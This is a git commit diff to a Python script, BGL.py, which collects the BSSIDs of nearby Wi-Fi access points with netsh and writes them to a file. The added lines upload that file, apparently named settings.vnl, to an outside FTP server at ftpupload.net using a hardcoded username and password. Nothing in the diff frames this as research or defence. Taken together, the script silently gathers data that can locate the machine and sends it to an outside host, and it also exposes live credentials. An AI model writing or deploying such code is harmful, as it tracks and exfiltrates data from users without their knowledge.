e15608b32f3b2a999c7a55d63a55dac25e7a5704
MekoNix <64309709+MekoNix@users.noreply.github.com>
2022-07-20 19:55:38 +0300

    Add files via upload

--- BGL.py
+++ BGL.py
@@ -1,4 +1,5 @@
-import os,time
+import os, time
+from ftplib import FTP
 # netsh wlan show all  | find "BSSID" - find  BSSID only of near AP
 # netsh wlan show interfaces | find "BSSID" - find BSSID only connected AP
 
@@ -9,3 +10,10 @@ netsh = os.popen('netsh wlan show all  | find "BSSID"')
 for id in netsh.readlines():
     f.write(id)
 f.close()
+from ftplib import FTP
+ftp = FTP('ftpupload.net')
+ftp.login(user="epiz_32209791",passwd="549qg0NEFZxz8R")
+ftp.cwd(dirname="htdocs")
+path="settings.vnl"
+with open(path, 'rb') as fobj:
+    ftp.storbinary('STOR ' + path, fobj, 1024)
